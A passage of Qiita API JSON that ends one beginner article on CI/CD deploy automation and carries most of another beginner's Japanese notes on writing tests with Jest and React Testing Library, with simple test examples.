:hatched_chick:おわりに\n今回、CI/CDの導入を通して、開発からデプロイまでのイメージがついたと感じています。\n私の中で`リリースを自ら行えること・自動化できたこと`は自信になったと感じています。\n余談ですが、目的をもって行動するを意識するようになったことで晩御飯を作る時間が短くなりました。\n（これを作るぞって決めて手順を考えた後に行動しているからでしょうか？）\n\n# 参考\n\nhttps://ja.wikipedia.org/wiki/CI/CD#:~:text=%E3%82%BD%E3%83%95%E3%83%88%E3%82%A6%E3%82%A7%E3%82%A2%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%83%AA%E3%83%B3%E3%82%B0%E3%81%A7%E3%81%AF%E3%80%81%20CI%20%2F%20CD,%E7%B5%84%E3%81%BF%E5%90%88%E3%82%8F%E3%81%9B%E3%81%9F%E3%83%97%E3%83%A9%E3%82%AF%E3%83%86%E3%82%A3%E3%82%B9%E3%82%92%E6%8C%87%E3%81%99%E3%80%82\n\n\nhttps://zenn.dev/yumemi_inc/articles/2020-10-06-react-firebase-deploy\n\n\nhttps://qiita.com/Teach/items/d2c4d7bec98228df1807\n\n\nhttps://docs.github.com/ja/actions\n\n# JISOUのメンバー募集中！\nプログラミングコーチングJISOUでは、新たなメンバーを募集しています。\n日本一のアウトプットコミュニティでキャリアアップしませんか？\n興味のある方は、ぜひホームページをのぞいてみてください！\n▼▼▼\n\nhttps://projisou.jp\n","coediting":false,"comments_count":0,"created_at":"2025-03-16T18:33:22+09:00","group":null,"id":"189a526901c06f756178","likes_count":6,"private":false,"reactions_count":0,"stocks_count":4,"tags":[{"name":"初心者","versions":[]},{"name":"ポエム","versions":[]},{"name":"自動化","versions":[]},{"name":"デプロイ","versions":[]},{"name":"個人開発","versions":[]}],"title":"【CI/CD入門】開発初心者がデプロイの自動化に挑戦してみた","updated_at":"2025-03-16T18:37:25+09:00","url":"https://qiita.com/asa129/items/189a526901c06f756178","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":2748,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:86\">Jest React Testing Libraryについて理解を深めるため記事にしました。</p>\n<h1 data-sourcepos=\"4:1-4:38\">\n<span id=\"理解するためのアプローチ\" class=\"fragment\"></span><a href=\"#%E7%90%86%E8%A7%A3%E3%81%99%E3%82%8B%E3%81%9F%E3%82%81%E3%81%AE%E3%82%A2%E3%83%97%E3%83%AD%E3%83%BC%E3%83%81\"><i class=\"fa fa-link\"></i></a>理解するためのアプローチ</h1>\n<p data-sourcepos=\"5:1-5:51\">以下の流れで進めることにしました。</p>\n<ol data-sourcepos=\"7:1-11:0\">\n<li data-sourcepos=\"7:1-7:74\">JestとReact Testing Library がそもそも何なのかを理解する</li>\n<li data-sourcepos=\"8:1-8:91\">JestとReact Testing Libraryの基本的なテストコードの書き方を理解する</li>\n<li data-sourcepos=\"9:1-11:0\">自分で作ったプロジェクトにテストを組み込んで見る</li>\n</ol>\n<h1 data-sourcepos=\"12:1-12:52\">\n<span id=\"1-jest--react-testing-library-の基本を知る\" class=\"fragment\"></span><a href=\"#1-jest--react-testing-library-%E3%81%AE%E5%9F%BA%E6%9C%AC%E3%82%92%E7%9F%A5%E3%82%8B\"><i class=\"fa fa-link\"></i></a>1. Jest &amp; React Testing Library の基本を知る</h1>\n<p data-sourcepos=\"13:1-13:85\">Jest と Testing Library が何をするものなのか、大まかに理解する。</p>\n<h2 data-sourcepos=\"15:1-15:13\">\n<span id=\"jestとは\" class=\"fragment\"></span><a href=\"#jest%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>Jestとは</h2>\n<p data-sourcepos=\"16:1-17:63\">JavaScript テスティングフレームワーク<br>\n関数やロジックを対象としてテストすると理解</p>\n<blockquote data-sourcepos=\"19:1-19:331\">\n<p data-sourcepos=\"19:3-19:331\">Jest はあらゆる JavaScript のコードベースの正しさを保証するために設計された JavaScript テスティングフレームワークです。親しみやすく、豊富な機能を持つAPIによって簡単にテストを書くことができ、さらには素早く結果を得ることができます。</p>\n</blockquote>\n<p data-sourcepos=\"21:1-21:21\"><iframe id=\"qiita-embed-content__2c6a63f571a4d42b5a4f1d9328badcff\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__2c6a63f571a4d42b5a4f1d9328badcff\" data-content=\"https%3A%2F%2Fjestjs.io%2Fja%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h2 data-sourcepos=\"23:1-23:30\">\n<span id=\"react-testing-libraryとは\" class=\"fragment\"></span><a href=\"#react-testing-library%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>React Testing Libraryとは</h2>\n<p data-sourcepos=\"24:1-25:76\">Reactコンポーネントのテストを行うためのライブラリ。<br>\n「ユーザーの視点でテストを書く」 ためのツールを提供</p>\n<p data-sourcepos=\"27:1-27:162\">ユーザーがボタンを押したり、画面に入力した際正しく動くかどうかなどユーザーが行う操作に対してテストすると理解</p>\n<p data-sourcepos=\"29:1-29:28\"><iframe id=\"qiita-embed-content__a361c7641c8c3cbb3f89487d3059a27a\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a361c7641c8c3cbb3f89487d3059a27a\" data-content=\"https%3A%2F%2Ftesting-library.com%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"32:1-32:50\">\n<span id=\"2-基本的なテストの書き方を覚える\" class=\"fragment\"></span><a href=\"#2-%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E3%83%86%E3%82%B9%E3%83%88%E3%81%AE%E6%9B%B8%E3%81%8D%E6%96%B9%E3%82%92%E8%A6%9A%E3%81%88%E3%82%8B\"><i class=\"fa fa-link\"></i></a>2. 基本的なテストの書き方を覚える</h1>\n<h2 data-sourcepos=\"33:1-33:7\">\n<span id=\"jest\" class=\"fragment\"></span><a href=\"#jest\"><i class=\"fa fa-link\"></i></a>Jest</h2>\n<p data-sourcepos=\"35:1-35:84\">公式のチュートリアルでは以下の順番で説明されていました。</p>\n<ol data-sourcepos=\"36:1-41:0\">\n<li data-sourcepos=\"36:1-36:10\">Matcher</li>\n<li data-sourcepos=\"37:1-37:33\">非同期コードのテスト</li>\n<li data-sourcepos=\"38:1-38:30\">セットアップと破棄</li>\n<li data-sourcepos=\"39:1-39:18\">モック関数</li>\n<li data-sourcepos=\"40:1-41:0\">Jestプラットフォーム</li>\n</ol>\n<p data-sourcepos=\"42:1-42:41\"><iframe id=\"qiita-embed-content__89441d5bfe9513e772c03637aa36f647\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__89441d5bfe9513e772c03637aa36f647\" data-content=\"https%3A%2F%2Fjestjs.io%2Fja%2Fdocs%2Fgetting-started\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h3 data-sourcepos=\"44:1-44:13\">\n<span id=\"1matcher\" class=\"fragment\"></span><a href=\"#1matcher\"><i class=\"fa fa-link\"></i></a>1.Matcher</h3>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"46:1-51:3\">\n<div class=\"code-lang\"><span class=\"bold\">sum.js</span></div>\n<div class=\"highlight\"><pre><code><span class=\"kd\">function</span> <span class=\"nf\">sum</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">return</span> <span class=\"nx\">a</span> <span class=\"o\">+</span> <span class=\"nx\">b</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"nx\">module</span><span class=\"p\">.</span><span class=\"nx\">exports</span> <span class=\"o\">=</span> <span class=\"nx\">sum</span><span class=\"p\">;</span>\n</code></pre></div>\n</div>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"53:1-59:3\">\n<div class=\"code-lang\"><span class=\"bold\">sum.test.js</span></div>\n<div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">sum</span> <span class=\"o\">=</span> <span class=\"nf\">require</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">./sum</span><span class=\"dl\">'</span><span class=\"p\">);</span>\n\n<span class=\"nf\">test</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">adds 1 + 2 to equal 3</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nf\">sum</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">)).</span><span class=\"nf\">toBe</span><span class=\"p\">(</span><span class=\"mi\">3</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"61:1-62:27\">expect()にテストしたい対象を指定（sum関数）<br>\ntoBe()に期待値を指定</p>\n<p data-sourcepos=\"64:1-64:66\">値が厳密に等しいかどうかをテストしてくれる。</p>\n<h3 data-sourcepos=\"66:1-66:36\">\n<span id=\"2非同期コードのテスト\" class=\"fragment\"></span><a href=\"#2%E9%9D%9E%E5%90%8C%E6%9C%9F%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AE%E3%83%86%E3%82%B9%E3%83%88\"><i class=\"fa fa-link\"></i></a>2.非同期コードのテスト</h3>\n<p data-sourcepos=\"67:1-68:24\">・ Async/Await<br>\n・ .resolves / .rejects</p>\n<blockquote data-sourcepos=\"70:1-70:251\">\n<p data-sourcepos=\"70:3-70:251\">async と awaitをテストで使用できます。 非同期テストを書くには、 testに渡す関数の前にasync キーワードを記述するだけです。 例えば、同じfetchData シナリオは次のようにテストできます:</p>\n</blockquote>\n<p data-sourcepos=\"72:1-72:65\">テストコードでもasync/awaitの使用ができると理解</p>\n<blockquote data-sourcepos=\"74:1-74:209\">\n<p data-sourcepos=\"74:4-74:209\">expect宣言で.resolves マッチャを使うこともでき、Jestはそのpromiseが解決されるまで待機します。 promiseがrejectされた場合は、テストは自動的に失敗します。</p>\n</blockquote>\n<blockquote data-sourcepos=\"76:1-76:243\">\n<p data-sourcepos=\"76:3-76:243\">promiseがrejectされることを期待するケースでは.rejects マッチャを使用してください。 .resolvesマッチャと似た動作をします。 promiseが成功した場合は、テストは自動的に失敗します。</p>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"78:1-86:3\"><div class=\"highlight\"><pre><code><span class=\"nf\">test</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">the data is peanut butter</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"k\">await</span> <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nf\">fetchData</span><span class=\"p\">()).</span><span class=\"nx\">resolves</span><span class=\"p\">.</span><span class=\"nf\">toBe</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">peanut butter</span><span class=\"dl\">'</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n\n<span class=\"nf\">test</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">the fetch fails with an error</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"k\">await</span> <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nf\">fetchData</span><span class=\"p\">()).</span><span class=\"nx\">rejects</span><span class=\"p\">.</span><span class=\"nf\">toMatch</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">error</span><span class=\"dl\">'</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n</code></pre></div></div>\n<p data-sourcepos=\"88:1-89:118\">テスト対象expect（fetchData()）の処理が完了されることを確認できるのが.resolvesマッチャ<br>\nテスト対象expect（fetchData()）の処理が完了されないことを確認できるのが.rejectsマッチャ</p>\n<h3 data-sourcepos=\"91:1-91:33\">\n<span id=\"3セットアップと破棄\" class=\"fragment\"></span><a href=\"#3%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97%E3%81%A8%E7%A0%B4%E6%A3%84\"><i class=\"fa fa-link\"></i></a>3.セットアップと破棄</h3>\n<h4 data-sourcepos=\"92:1-92:63\">\n<span id=\"繰り返しのセットアップbeforeeachとaftereach\" class=\"fragment\"></span><a href=\"#%E7%B9%B0%E3%82%8A%E8%BF%94%E3%81%97%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97beforeeach%E3%81%A8aftereach\"><i class=\"fa fa-link\"></i></a>繰り返しのセットアップ　beforeEachとafterEach</h4>\n<blockquote data-sourcepos=\"94:1-94:123\">\n<p data-sourcepos=\"94:3-94:123\">多くのテストで繰り返し行う必要がある場合は、beforeEach と afterEach フックを使用します。</p>\n</blockquote>\n<p data-sourcepos=\"96:1-96:99\">各テストで同じ処理を何度も実行する必要がある場合に使用できると理解</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"98:1-114:3\"><div class=\"highlight\"><pre><code><span class=\"nf\">beforeEach</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">initializeCityDatabase</span><span class=\"p\">();</span>\n<span class=\"p\">});</span>\n\n<span class=\"nf\">afterEach</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">clearCityDatabase</span><span class=\"p\">();</span>\n<span class=\"p\">});</span>\n\n<span class=\"nf\">test</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">city database has Vienna</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nf\">isCity</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">Vienna</span><span class=\"dl\">'</span><span class=\"p\">)).</span><span class=\"nf\">toBeTruthy</span><span class=\"p\">();</span>\n<span class=\"p\">});</span>\n\n<span class=\"nf\">test</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">city database has San Juan</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nf\">isCity</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">San Juan</span><span class=\"dl\">'</span><span class=\"p\">)).</span><span class=\"nf\">toBeTruthy</span><span class=\"p\">();</span>\n<span class=\"p\">});</span>\n</code></pre></div></div>\n<p data-sourcepos=\"116:1-117:59\">city database has Vienna、city database has San Juanそれぞれのテスト実行前にinitializeCityDatabase();を実行<br>\nテスト実行後はclearCityDatabase();が実行される</p>\n<h3 data-sourcepos=\"119:1-119:21\">\n<span id=\"4モック関数\" class=\"fragment\"></span><a href=\"#4%E3%83%A2%E3%83%83%E3%82%AF%E9%96%A2%E6%95%B0\"><i class=\"fa fa-link\"></i></a>4.モック関数</h3>\n<p data-sourcepos=\"121:1-122:66\">const mock = jest.fn();でモックを作れる。<br>\nテスト対象で実際に動かしたくないときに使用。</p>\n<h3 data-sourcepos=\"125:1-125:34\">\n<span id=\"5jestプラットフォーム\" class=\"fragment\"></span><a href=\"#5jest%E3%83%97%E3%83%A9%E3%83%83%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0\"><i class=\"fa fa-link\"></i></a>5.Jestプラットフォーム</h3>\n<p data-sourcepos=\"126:1-126:70\">Jestの特定の機能をパッケージ化して便利にしたもの</p>\n<h2 data-sourcepos=\"129:1-129:24\">\n<span id=\"react-testing-library\" class=\"fragment\"></span><a href=\"#react-testing-library\"><i class=\"fa fa-link\"></i></a>React Testing Library</h2>\n<p data-sourcepos=\"131:1-131:59\"><iframe id=\"qiita-embed-content__ce0babd571be388caa5a4b886df992b0\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__ce0babd571be388caa5a4b886df992b0\" data-content=\"https%3A%2F%2Fqiita.com%2Fossan-engineer%2Fitems%2F4757d7457fafd44d2d2f\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"135:1-135:68\"><iframe id=\"qiita-embed-content__0d148b61b566d8573a1cf84a9c1e5d52\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__0d148b61b566d8573a1cf84a9c1e5d52\" data-content=\"https%3A%2F%2Ftesting-library.com%2Fdocs%2Freact-testing-library%2Fexample-intro\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"137:1-137:66\">こちらの記事とドキュメントを参考にしました。</p>\n<h3 data-sourcepos=\"139:1-139:24\">\n<span id=\"1レンダリング\" class=\"fragment\"></span><a href=\"#1%E3%83%AC%E3%83%B3%E3%83%80%E3%83%AA%E3%83%B3%E3%82%B0\"><i class=\"fa fa-link\"></i></a>1.レンダリング</h3>\n<p data-sourcepos=\"141:1-141:75\">render関数でテストしたいコンポーネントをレンダリング</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"143:1-154:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">React</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Title Test</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">test1</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">render</span><span class=\"p\">(</span><span class=\"o\">&lt;</span><span class=\"nx\">App</span> <span class=\"o\">/&gt;</span><span class=\"p\">);</span>\n\t\t<span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">debug</span><span class=\"p\">();</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div></div>\n<p data-sourcepos=\"155:1-156:122\">screen.debug()でコンポーネントの中身をコンソール上で表示できる<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb6b19567-e46a-4730-938e-ecab0a705a87.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3d11cab340aab6b91fd019dbc79b2ce1\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb6b19567-e46a-4730-938e-ecab0a705a87.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3d11cab340aab6b91fd019dbc79b2ce1\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb6b19567-e46a-4730-938e-ecab0a705a87.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=37e75395368d447a95f973f2c4a7daca 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/b6b19567-e46a-4730-938e-ecab0a705a87.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"158:1-158:21\">\n<span id=\"2要素の取得\" class=\"fragment\"></span><a href=\"#2%E8%A6%81%E7%B4%A0%E3%81%AE%E5%8F%96%E5%BE%97\"><i class=\"fa fa-link\"></i></a>2.要素の取得</h3>\n<p data-sourcepos=\"160:1-161:66\">レンダリングした要素を取得して、テスト対象を特定します。<br>\n要素の取得方法は下記の記事を参考にしました。</p>\n<p data-sourcepos=\"163:1-163:59\"><iframe id=\"qiita-embed-content__e66e60d2b118635102f9e767ff70a0ce\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__e66e60d2b118635102f9e767ff70a0ce\" data-content=\"https%3A%2F%2Fqiita.com%2Fossan-engineer%2Fitems%2F4757d7457fafd44d2d2f\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"165:1-165:77\">getByとfindByの違いについて、エラーを通して理解しました</p>\n<ul data-sourcepos=\"167:4-170:0\">\n<li data-sourcepos=\"167:4-167:82\">getBy*: 要素が見つからないと例外を投げる（存在確認用）</li>\n<li data-sourcepos=\"168:4-168:85\">queryBy*: 要素が見つからなくてもnullを返す（非存在確認用）</li>\n<li data-sourcepos=\"169:4-170:0\">findBy*: 非同期で要素を探し、Promiseを返す（非同期表示確認用）</li>\n</ul>\n<p data-sourcepos=\"171:1-171:51\"><iframe id=\"qiita-embed-content__69d7baedef454ac6d71ca056ed00dbfa\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__69d7baedef454ac6d71ca056ed00dbfa\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2Fdaf4c12cc5571a5a4b17\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"174:1-174:76\">\n<span id=\"3自分で作ったプロジェクトにテストを組み込んで見る\" class=\"fragment\"></span><a href=\"#3%E8%87%AA%E5%88%86%E3%81%A7%E4%BD%9C%E3%81%A3%E3%81%9F%E3%83%97%E3%83%AD%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AB%E3%83%86%E3%82%B9%E3%83%88%E3%82%92%E7%B5%84%E3%81%BF%E8%BE%BC%E3%82%93%E3%81%A7%E8%A6%8B%E3%82%8B\"><i class=\"fa fa-link\"></i></a>3.自分で作ったプロジェクトにテストを組み込んで見る</h1>\n<h2 data-sourcepos=\"176:1-176:27\">\n<span id=\"テストしたいこと\" class=\"fragment\"></span><a href=\"#%E3%83%86%E3%82%B9%E3%83%88%E3%81%97%E3%81%9F%E3%81%84%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a>テストしたいこと</h2>\n<p data-sourcepos=\"177:1-177:66\">入力をしないで登録を押すとエラーが表示される</p>\n<h2 data-sourcepos=\"179:1-179:24\">\n<span id=\"実現するために\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E7%8F%BE%E3%81%99%E3%82%8B%E3%81%9F%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>実現するために</h2>\n<p data-sourcepos=\"180:1-182:42\"><code>expect</code>：登録ボタンを押下<br>\n<code>Matcher</code>：画面に表示されたエラー内容が期待値通りになること<br>\nで実現できるか考えてみました</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"185:1-207:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">React</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"dl\">'</span><span class=\"s1\">@testing-library/jest-dom</span><span class=\"dl\">'</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">within</span><span class=\"p\">,</span> <span class=\"nx\">waitFor</span><span class=\"p\">,</span> <span class=\"nx\">cleanup</span><span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">userEvent</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/user-event</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nf\">afterEach</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\t<span class=\"nf\">cleanup</span><span class=\"p\">();</span>\n<span class=\"p\">});</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">RegistDelete Test</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\t<span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">入力をしないで登録を押すとエラーが表示される</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\n\t\t<span class=\"nf\">render</span><span class=\"p\">(</span><span class=\"o\">&lt;</span><span class=\"nx\">App</span> <span class=\"o\">/&gt;</span><span class=\"p\">);</span>\n\n\t\t<span class=\"c1\">// 登録ボタン押下</span>\n\t\t<span class=\"nx\">userEvent</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">add</span><span class=\"dl\">\"</span><span class=\"p\">));</span>\n\n\t\t<span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">error</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nf\">toHaveTextContent</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">入力されていない項目があります</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\t<span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"210:1-210:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"211:1-211:219\">基本的なことをまとめてみました。モック関数などまだまだわからないことばかりなので、今後も学習を進めて適切なテストコードをかけるようになりたいです。</p>\n<h1 data-sourcepos=\"213:1-213:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"214:1-214:21\"><iframe id=\"qiita-embed-content__e7bd3400990590d5ea0cc195dedefa67\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__e7bd3400990590d5ea0cc195dedefa67\" data-content=\"https%3A%2F%2Fjestjs.io%2Fja%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"216:1-216:28\"><iframe id=\"qiita-embed-content__80d1dc35250255f6f244b2398794c5ab\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__80d1dc35250255f6f244b2398794c5ab\" data-content=\"https%3A%2F%2Ftesting-library.com%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"218:1-218:59\"><iframe id=\"qiita-embed-content__c209eb170f8d474ef0ef4eb7a7e49dec\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__c209eb170f8d474ef0ef4eb7a7e49dec\" 